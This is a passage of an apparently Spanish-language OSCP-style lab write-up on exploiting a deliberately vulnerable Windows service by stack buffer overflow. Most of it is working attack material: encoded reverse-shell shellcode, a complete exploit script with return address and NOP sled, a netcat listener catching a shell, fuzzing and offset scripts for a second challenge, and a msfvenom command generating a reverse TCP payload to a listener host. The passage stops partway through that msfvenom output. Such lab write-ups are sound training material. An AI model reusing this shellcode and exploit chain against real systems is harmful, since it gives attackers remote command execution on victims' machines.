\u0026#34;\\xbd\\xb5\\xea\\x94\\xb3\\xda\\xc6\\xd9\\x74\\x24\\xf4\\x5b\\x31\\xc9\\xb1\u0026#34; \u0026#34;\\x52\\x83\\xeb\\xfc\\x31\\x6b\\x0e\\x03\\xde\\xe4\\x76\\x46\\xdc\\x11\\xf4\u0026#34; \u0026#34;\\xa9\\x1c\\xe2\\x99\\x20\\xf9\\xd3\\x99\\x57\\x8a\\x44\\x2a\\x13\\xde\\x68\u0026#34; \u0026#34;\\xc1\\x71\\xca\\xfb\\xa7\\x5d\\xfd\\x4c\\x0d\\xb8\\x30\\x4c\\x3e\\xf8\\x53\u0026#34; \u0026#34;\\xce\\x3d\\x2d\\xb3\\xef\\x8d\\x20\\xb2\\x28\\xf3\\xc9\\xe6\\xe1\\x7f\\x7f\u0026#34; \u0026#34;\\x16\\x85\\xca\\xbc\\x9d\\xd5\\xdb\\xc4\\x42\\xad\\xda\\xe5\\xd5\\xa5\\x84\u0026#34; \u0026#34;\\x25\\xd4\\x6a\\xbd\\x6f\\xce\\x6f\\xf8\\x26\\x65\\x5b\\x76\\xb9\\xaf\\x95\u0026#34; \u0026#34;\\x77\\x16\\x8e\\x19\\x8a\\x66\\xd7\\x9e\\x75\\x1d\\x21\\xdd\\x08\\x26\\xf6\u0026#34; \u0026#34;\\x9f\\xd6\\xa3\\xec\\x38\\x9c\\x14\\xc8\\xb9\\x71\\xc2\\x9b\\xb6\\x3e\\x80\u0026#34; \u0026#34;\\xc3\\xda\\xc1\\x45\\x78\\xe6\\x4a\\x68\\xae\\x6e\\x08\\x4f\\x6a\\x2a\\xca\u0026#34; \u0026#34;\\xee\\x2b\\x96\\xbd\\x0f\\x2b\\x79\\x61\\xaa\\x20\\x94\\x76\\xc7\\x6b\\xf1\u0026#34; \u0026#34;\\xbb\\xea\\x93\\x01\\xd4\\x7d\\xe0\\x33\\x7b\\xd6\\x6e\\x78\\xf4\\xf0\\x69\u0026#34; \u0026#34;\\x7f\\x2f\\x44\\xe5\\x7e\\xd0\\xb5\\x2c\\x45\\x84\\xe5\\x46\\x6c\\xa5\\x6d\u0026#34; \u0026#34;\\x96\\x91\\x70\\x21\\xc6\\x3d\\x2b\\x82\\xb6\\xfd\\x9b\\x6a\\xdc\\xf1\\xc4\u0026#34; \u0026#34;\\x8b\\xdf\\xdb\\x6c\\x21\\x1a\\x8c\\x52\\x1e\\x32\\x4d\\x3b\\x5d\\x3a\\x48\u0026#34; \u0026#34;\\x81\\xe8\\xdc\\x38\\xe5\\xbc\\x77\\xd5\\x9c\\xe4\\x03\\x44\\x60\\x33\\x6e\u0026#34; \u0026#34;\\x46\\xea\\xb0\\x8f\\x09\\x1b\\xbc\\x83\\xfe\\xeb\\x8b\\xf9\\xa9\\xf4\\x21\u0026#34; \u0026#34;\\x95\\x36\\x66\\xae\\x65\\x30\\x9b\\x79\\x32\\x15\\x6d\\x70\\xd6\\x8b\\xd4\u0026#34; \u0026#34;\\x2a\\xc4\\x51\\x80\\x15\\x4c\\x8e\\x71\\x9b\\x4d\\x43\\xcd\\xbf\\x5d\\x9d\u0026#34; \u0026#34;\\xce\\xfb\\x09\\x71\\x99\\x55\\xe7\\x37\\x73\\x14\\x51\\xee\\x28\\xfe\\x35\u0026#34; \u0026#34;\\x77\\x03\\xc1\\x43\\x78\\x4e\\xb7\\xab\\xc9\\x27\\x8e\\xd4\\xe6\\xaf\\x06\u0026#34; \u0026#34;\\xad\\x1a\\x50\\xe8\\x64\\x9f\\x70\\x0b\\xac\\xea\\x18\\x92\\x25\\x57\\x45\u0026#34; \u0026#34;\\x25\\x90\\x94\\x70\\xa6\\x10\\x65\\x87\\xb6\\x51\\x60\\xc3\\x70\\x8a\\x18\u0026#34; \u0026#34;\\x5c\\x15\\xac\\x8f\\x5d\\x3c\u0026#34;; Agregamos nuestros NOPs antes de nuestro shellcode, para darle a este ultimo espacio de ser necesario, en total agregamos 16 bytes.\n1 nops = \u0026#34;\\x90\u0026#34; * 16 Finalmente agregamos el shellcode ajustando y preservando la longitud del buffer (2482) con el padding o \u0026ldquo;C\u0026quot;s.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 # Shellcode shellcode = ( \u0026#34;\\xbd\\xb5\\xea\\x94\\xb3\\xda\\xc6\\xd9\\x74\\x24\\xf4\\x5b\\x31\\xc9\\xb1\u0026#34; \u0026#34;\\x52\\x83\\xeb\\xfc\\x31\\x6b\\x0e\\x03\\xde\\xe4\\x76\\x46\\xdc\\x11\\xf4\u0026#34; \u0026#34;\\xa9\\x1c\\xe2\\x99\\x20\\xf9\\xd3\\x99\\x57\\x8a\\x44\\x2a\\x13\\xde\\x68\u0026#34; \u0026#34;\\xc1\\x71\\xca\\xfb\\xa7\\x5d\\xfd\\x4c\\x0d\\xb8\\x30\\x4c\\x3e\\xf8\\x53\u0026#34; \u0026#34;\\xce\\x3d\\x2d\\xb3\\xef\\x8d\\x20\\xb2\\x28\\xf3\\xc9\\xe6\\xe1\\x7f\\x7f\u0026#34; \u0026#34;\\x16\\x85\\xca\\xbc\\x9d\\xd5\\xdb\\xc4\\x42\\xad\\xda\\xe5\\xd5\\xa5\\x84\u0026#34; \u0026#34;\\x25\\xd4\\x6a\\xbd\\x6f\\xce\\x6f\\xf8\\x26\\x65\\x5b\\x76\\xb9\\xaf\\x95\u0026#34; \u0026#34;\\x77\\x16\\x8e\\x19\\x8a\\x66\\xd7\\x9e\\x75\\x1d\\x21\\xdd\\x08\\x26\\xf6\u0026#34; \u0026#34;\\x9f\\xd6\\xa3\\xec\\x38\\x9c\\x14\\xc8\\xb9\\x71\\xc2\\x9b\\xb6\\x3e\\x80\u0026#34; \u0026#34;\\xc3\\xda\\xc1\\x45\\x78\\xe6\\x4a\\x68\\xae\\x6e\\x08\\x4f\\x6a\\x2a\\xca\u0026#34; \u0026#34;\\xee\\x2b\\x96\\xbd\\x0f\\x2b\\x79\\x61\\xaa\\x20\\x94\\x76\\xc7\\x6b\\xf1\u0026#34; \u0026#34;\\xbb\\xea\\x93\\x01\\xd4\\x7d\\xe0\\x33\\x7b\\xd6\\x6e\\x78\\xf4\\xf0\\x69\u0026#34; \u0026#34;\\x7f\\x2f\\x44\\xe5\\x7e\\xd0\\xb5\\x2c\\x45\\x84\\xe5\\x46\\x6c\\xa5\\x6d\u0026#34; \u0026#34;\\x96\\x91\\x70\\x21\\xc6\\x3d\\x2b\\x82\\xb6\\xfd\\x9b\\x6a\\xdc\\xf1\\xc4\u0026#34; \u0026#34;\\x8b\\xdf\\xdb\\x6c\\x21\\x1a\\x8c\\x52\\x1e\\x32\\x4d\\x3b\\x5d\\x3a\\x48\u0026#34; \u0026#34;\\x81\\xe8\\xdc\\x38\\xe5\\xbc\\x77\\xd5\\x9c\\xe4\\x03\\x44\\x60\\x33\\x6e\u0026#34; \u0026#34;\\x46\\xea\\xb0\\x8f\\x09\\x1b\\xbc\\x83\\xfe\\xeb\\x8b\\xf9\\xa9\\xf4\\x21\u0026#34; \u0026#34;\\x95\\x36\\x66\\xae\\x65\\x30\\x9b\\x79\\x32\\x15\\x6d\\x70\\xd6\\x8b\\xd4\u0026#34; \u0026#34;\\x2a\\xc4\\x51\\x80\\x15\\x4c\\x8e\\x71\\x9b\\x4d\\x43\\xcd\\xbf\\x5d\\x9d\u0026#34; \u0026#34;\\xce\\xfb\\x09\\x71\\x99\\x55\\xe7\\x37\\x73\\x14\\x51\\xee\\x28\\xfe\\x35\u0026#34; \u0026#34;\\x77\\x03\\xc1\\x43\\x78\\x4e\\xb7\\xab\\xc9\\x27\\x8e\\xd4\\xe6\\xaf\\x06\u0026#34; \u0026#34;\\xad\\x1a\\x50\\xe8\\x64\\x9f\\x70\\x0b\\xac\\xea\\x18\\x92\\x25\\x57\\x45\u0026#34; \u0026#34;\\x25\\x90\\x94\\x70\\xa6\\x10\\x65\\x87\\xb6\\x51\\x60\\xc3\\x70\\x8a\\x18\u0026#34; \u0026#34;\\x5c\\x15\\xac\\x8f\\x5d\\x3c\u0026#34;) eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;, 0x625011AF) nops = \u0026#34;\\x90\u0026#34; * 16 padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1978 + eip_ret + nops + shellcode + padding * (2482 - 1978 - 4 - 16 - 351) # junk 1978, eip 4, nops 16, shellcode 351, padding 133 = 2482 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW1 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Error.\u0026#34;) Ejecutamos netcat a la escucha del puerto 1338.\n1 2 ➜ BufferOverflow nc -lnvp 1338 Listening on 0.0.0.0 1338 Realizamos la ejecucion de nuestro script final y logramos obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ➜ BufferOverflow nc -lnvp 1338 Listening on 0.0.0.0 1338 Connection received on 192.168.22.128 49177 Microsoft Windows [Versin 6.1.7601] Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos. C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt;dir dir El volumen de la unidad C no tiene etiqueta. El nmero de serie del volumen es: 96D1-5A10 Directorio de C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp 03/07/2020 08:38 p.m. \u0026lt;DIR\u0026gt; . 03/07/2020 08:38 p.m. \u0026lt;DIR\u0026gt; .. 06/07/2020 06:29 p.m. 16,601 essfunc.dll 20/07/2020 08:50 p.m. 54,648 oscp.exe 2 archivos 71,249 bytes 2 dirs 42,065,817,600 bytes libres C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt;echo %username% echo %username% sckull C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt; Overflow 2 Fuzzing Realizamos fuzzing al segundo reto utilizando esta vez OVERFLOW2.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toscp1.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 # Fuzzing buff = [\u0026#34;A\u0026#34;] c = 100 while len(buff) \u0026lt; 30: buff.append(\u0026#34;A\u0026#34;*c) c += 100 p1 = log.progress(\u0026#34;Progreso\u0026#34;) for string in buff: try: p1.status(\u0026#34;Enviando %s bytes.\u0026#34; % len(string)) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW2 %s\\r\\n\u0026#34; % string) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo con %s bytes.\u0026#34; % len(string)) sys.exit(1) Vemos que el script se detuvo y muestra 800 bytes.\n1 2 3 4 ➜ OVERFLOW_2 ./overflow2.py 192.168.22.128 [↖] Progreso: Enviando 800 bytes. [-] Parece que el programa se detuvo con 800 bytes. ➜ OVERFLOW_2 Vemos en el debugger que el registro EIP se sobreescribio con \u0026ldquo;A\u0026quot;s (41414141), de igual forma vemos en el ESP lleno de \u0026ldquo;A\u0026quot;s.\nOffset EIP Para este ejercicio vamos a tomar una longitud del buffer de 1000 bytes.\n1 2 3 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ ./pattern_create.rb -l 1000 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B Configuramos nuestro script para enviar el patron creado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # offset eip buff = \u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B\u0026#34; try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW2 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Vemos que el programa se detuvo y el valor del ESP.\nUtilizamos mona para calcular el offset, vemos que el EIP muestra un offset de 634.\n1 2 3 4 5 6 7 8 !mona findmsp -distance 1000 [+] Looking for cyclic pattern in memory [..] [+] Examining registers EIP contains normal pattern : 0x76413176 (offset 634) ESP (0x0181fa30) points at offset 638 in normal pattern (length 362) EBP contains normal pattern : 0x41307641 (offset 630) EBX contains normal pattern : 0x39754138 (offset 626) Control EIP Utilizando la longitud del offset agregamos \u0026ldquo;B\u0026quot;s para confirmar que el offset es exacto y que tenemos el control del registro EIP, además agregamos un padding para mantener la longitud del buffer (1000).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 634 + eip_ret + padding * (1000-634-4) # padding 362 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW2 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Podemos notar que el registro EIP esta lleno con las 4 \u0026ldquo;B\u0026quot;s que agregamos y el registro ESP esta lleno del padding.\nEspacio - Shellcode Aumentamos el padding a 150 para tener asegurado un espacio \u0026lsquo;decente\u0026rsquo; para nuestro shellcode, en este caso 150 bytes adicionales, en total tendríamos 512 bytes disponibles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 634 + eip_ret + padding * (1000-634-4 + 150) # padding 362 + 150 = 512 # 634 junk, 4 eip_ret, padding 512 # total buffer = 1150 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW2 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) El debugger no muestra el mismo comportamiento por lo que tomamos la longitud del buffer en 1150 bytes de los cuales 512 bytes serán para el shellcode y los nops (16 bytes).\nBadChars Generamos con mona un array con todos los badchars exeptuando el valor null (\\x00).\n1 !mona bytearray -cpb \u0026#34;\\x00\u0026#34; Modificamos nuestro script para enviar nuestros badchars.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 badchars = (\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; \u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 634 + eip_ret + badchars + padding * (1150 - 634 - 4 - 255) # padding 362 + 150 = 512 # 634 junk, 4 eip_ret, badchars 255, padding 257 # total buffer = 1150 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW2 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Realizamos la busqueda de badchars como en el primer reto. Inicialmente encontramos los badchars \u0026quot;\\x00\\x23\\x3c\\x83\\xba\u0026quot;.\nJMP ESP Nuevamente como en el anterior ejercicio buscamos una instrucción de salto al ESP.\n1 2 3 4 5 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ ./nasm_shell.rb nasm \u0026gt; JMP ESP 00000000 FFE4 jmp esp nasm \u0026gt; Podemos utilizar cualquiera de estos comandos para encontrar una instrucción de salto al ESP, sin utilizar el valor \\xff\\e4 como anteriormente lo hicimos.\n1 2 !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x23\\x3c\\x83\\xba\u0026#34; !mona jmp -r esp -cpb \u0026#34;\\x00\\x23\\x3c\\x83\\xba\u0026#34; Ambos comandos nos muestran direcciones donde podemos encontrar la instrucción jmp esp.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 [+] Command used: !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x23\\x3c\\x83\\xba\u0026#34; [..] [+] Results : 0x625011af : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011bb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011c7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011d3 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011df : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011eb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011f7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501203 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501205 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) Found a total of 9 pointers [+] Command used: !mona jmp -r esp -cpb \u0026#34;\\x00\\x23\\x3c\\x83\\xba\u0026#34; [..] [+] Results : 0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011bb : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011c7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011d3 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011df : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011eb : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011f7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) Found a total of 9 pointers Shellcode Creamos nuestro shellcode pasandole los badchars que encontramos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.22.1 LPORT=1338 -a x86 --platform windows -f c -b \u0026#34;\\x00\\x23\\x3c\\x83\\xba\u0026#34; 1 ⨯ Found 11 compatible encoders Attempting to encode payload with 1 iterations of 